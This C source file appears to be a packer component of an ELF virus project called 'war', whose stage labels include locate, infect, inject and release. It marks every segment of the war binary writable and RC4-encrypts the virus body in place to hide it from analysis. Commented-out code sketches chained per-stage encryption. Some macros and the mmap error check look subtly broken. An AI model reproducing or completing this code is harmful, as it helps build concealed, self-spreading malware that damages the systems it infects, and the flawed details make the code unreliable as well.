#include "war.h"
#include <string.h>

#define START_ADDR		0x11f1
#define OPENING_ADDR	0x130d
#define WAR_ADDR		0x1809
#define LOCATE_ADDR		0x19da
#define INSPECT_ADDR	0x1dc3
#define INFECT_ADDR		0x2097
#define INJECT_ADDR		0x23ca
#define RELEASE_ADDR	0x2767
#define CYPHEREND_ADDR	0x2863
#define END_ADDR		0x2914
#define ENDOFDATA_ADDR	0x316a

#define ENT_SIZE	OPENING_ADDR - START_ADDR
#define F1_SIZE		WAR_ADDR - OPENING_ADDR
#define F2_SIZE		LOCATE_ADDR - WAR_ADDR
#define F3_SIZE		INSPECT_ADDR - LOCATE_ADDR
#define F4_SIZE		INFECT_ADDR - INSPECT_ADDR
#define F5_SIZE		INJECT_ADDR - INFECT_ADDR
#define F6_SIZE		RELEASE_ADDR - INJECT_ADDR
#define F7_SIZE		CYPHEREND_ADDR - RELEASE_ADDR
#define F8_SIZE		F9_ADDR - END_ADDR

// start
#define PACKER_KEY		0x11f1
// opening
#define PACKER_START	0x130d
// _rc4 - opening
#define END				0x2bf0
#define PACKER_SIZE		END - PACKER_START

char *ptr;

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void segment_write(char *ptr)
{
	Elf64_Ehdr	*header = ( Elf64_Ehdr *)ptr;
	Elf64_Phdr	*segment;

	for (Elf64_Half index = 0; index < header->e_phnum; index++)
	{
		segment = (Elf64_Phdr *)((void *)ptr + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));
		segment->p_flags |= PF_W;
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

int main(void)
{
	int			fd;
	char		*filename = "./war";
	t_key		keychain = {0};
	uint8_t		pack_key[KEY_SIZE];
	struct stat	statbuf;

	if ((fd = open(filename, O_RDWR)) < 0)
	{
		perror("open");
		exit(0);
	}

	if (stat(filename, &statbuf) < 0)
	{
		perror("stat");
		exit(0);
	}

	if ((ptr = mmap(NULL, statbuf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == NULL)
	{
		perror("mmap");
		exit(0);
	}

	segment_write(ptr);

	(void)keychain;

	memcpy(pack_key, ptr + PACKER_KEY, KEY_SIZE);
  	_rc4(pack_key, KEY_SIZE, (uint8_t*)ptr + PACKER_START, PACKER_SIZE);

	// release -> cypher_end
	/* update_one(&keychain, ptr + F6_ADDR, F6_SIZE); */
	/* revert_one(&keychain, ptr + F7_ADDR, F7_SIZE); */
	/* printf("cypher_end: start at [%p] size : %d key = %lx\n", ptr + F7_ADDR, F7_SIZE, keychain.one); */

	/* // inject -> release */
	/* update_two(&keychain, ptr + F5_ADDR, F5_SIZE); */
	/* revert_two(&keychain, ptr + F6_ADDR, F6_SIZE); */
	/* printf("release: start at [%p] size : %d key = %lx\n", ptr + F6_ADDR, F6_SIZE, keychain.two); */

	/* // infect -> inject */
	/* update_one(&keychain, ptr + F4_ADDR, F4_SIZE); */
	/* revert_one(&keychain, ptr + F5_ADDR, F5_SIZE); */
	/* printf("inject: start at [%p] size : %d key = %lx\n", ptr + F5_ADDR, F5_SIZE, keychain.one); */

	/* // inspect -> infect */
	/* update_two(&keychain, ptr + F3_ADDR, F3_SIZE); */
	/* revert_two(&keychain, ptr + F4_ADDR, F4_SIZE); */
	/* printf("infect : start at [%p] size : %d : key = %lx \n", ptr + F4_ADDR, F4_SIZE, keychain.two); */

	/* // locate -> inspect */
	/* update_one(&keychain, ptr + F2_ADDR, F2_SIZE); */
	/* revert_one(&keychain, ptr + F3_ADDR, F3_SIZE); */
	/* printf("inspect : start at [%p] size : %d : key = %lx\n", ptr + F3_ADDR, F3_SIZE, keychain.one); */

	/* // war-> locate */
	/* update_two(&keychain, ptr + F1_ADDR, F1_SIZE); */
	/* revert_two(&keychain, ptr + F2_ADDR, F2_SIZE); */
	/* printf("locate : start at [%p] size : %d key = %lx\n", ptr + F2_ADDR, F2_SIZE, keychain.two); */

	/* // opening -> war */
	/* update_one(&keychain, ptr + ENT_ADDR, ENT_SIZE); */
	/* revert_one(&keychain, ptr + F1_ADDR, F1_SIZE); */
	/* printf("war : start at [%p] size : %d key = %lx\n", ptr + F1_ADDR, F1_SIZE, keychain.one); */

	write(fd, ptr, statbuf.st_size);
	munmap(ptr, statbuf.st_size);
	close(fd);
}
